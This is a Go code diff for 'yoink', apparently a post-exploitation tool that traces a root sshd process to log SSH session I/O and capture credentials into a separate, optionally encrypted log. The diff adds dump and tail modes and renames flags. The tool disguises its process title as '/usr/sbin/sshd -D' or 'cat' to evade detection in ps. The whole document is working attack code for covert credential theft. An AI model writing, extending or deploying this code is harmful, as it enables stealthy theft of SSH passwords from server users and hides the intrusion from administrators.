@@ -10,20 +10,44 @@ import (
 	"./ghostrace/ghost/process"
 )
 
+var defaultTitle = "/usr/sbin/sshd -D"
+
 func main() {
 	fs := flag.NewFlagSet("yoink", flag.ExitOnError)
-	title := fs.String("title", "/usr/sbin/sshd -D", "set process title")
+	title := fs.String("title", defaultTitle, "set process title")
 	nullIO := fs.Bool("noio", false, "skip logging IO, still can log creds")
-	logPath := fs.String("o", "", "set output log (disables stdout, will logrotate on startup: TREAD CAREFULLY)")
-	credLog := fs.String("creds", "", "copy creds to separate log (O_APPEND and can encrypt with -encrypt. no compression or logrotate)")
-	key := fs.String("encrypt", "", "encrypt logs with key (must be 32 hex bytes)")
+	logPath := fs.String("log", "", "set output log (disables stdout, will logrotate on startup: TREAD CAREFULLY)")
+	credPath := fs.String("creds", "", "copy creds to separate log (O_APPEND and can encrypt with -key. no compression or logrotate)")
+	key := fs.String("key", "", "encrypt logs with key (must be 32 hex bytes)")
 	lzw := fs.Bool("lzw", false, "compress logs")
 	pid := fs.Int("sshd", 0, "force root sshd pid")
+	dump := fs.Bool("dump", false, "dump/decode log file(s) (default title changes to `vi`")
+	tail := fs.Bool("tail", false, "tail log file(s) (default title changes to `vi`)")
 	fs.Parse(os.Args[1:])
 	log.SetFlags(0)
 
+	if (*dump || *tail) && *title == defaultTitle {
+		*title = "cat"
+	}
+
 	// this changes our title in `ps`
 	gspt.SetProcTitle(*title)
+
+	// bail early if we're dumping or tailing
+	if *dump || *tail {
+		logs, creds, err := openLogs(*logPath, *credPath, *key, *lzw)
+		if err != nil {
+			log.Fatalf("[-] failed to open logs: %s", err)
+		}
+		if *dump {
+			dumpLogs(logs, creds)
+			return
+		}
+		if *tail {
+			tailLogs(logs, creds)
+			return
+		}
+	}
 
 	// set up logging
 	var output io.WriteCloser = os.Stderr
@@ -38,26 +62,28 @@ func main() {
 			log.Fatalf("[-] failed to open log %#v: %s", *logPath, err)
 		}
 	}
-	if *credLog != "" {
-		credOut, err = os.OpenFile(*credLog, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
+	if *credPath != "" {
+		credOut, err = os.OpenFile(*credPath, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
 		if err != nil {
-			log.Fatalf("[-] failed to open cred log %#v: %s", *credLog, err)
+			log.Fatalf("[-] failed to open cred log %#v: %s", *credPath, err)
 		}
 	}
 	if *lzw {
 		if *logPath == "" {
-			log.Println("[-] warning: -lzw requires -o")
+			log.Println("[-] warning: -lzw requires -log")
 		} else {
 			output = compressStream(output)
 		}
 	}
 	if *key != "" {
-		if *logPath == "" {
-			log.Println("[-] warning: -encrypt requires -o")
+		if *logPath == "" && *credPath == "" {
+			log.Println("[-] warning: -key requires -log or -creds")
 		} else {
-			output, err = encryptStream(output, *key)
-			if err != nil {
-				log.Fatalf("[-] encryption init failed: %s", err)
+			if output != os.Stderr {
+				output, err = encryptStream(output, *key)
+				if err != nil {
+					log.Fatalf("[-] encryption init failed: %s", err)
+				}
 			}
 			if credOut != nil {
 				credOut, err = encryptStream(credOut, *key)
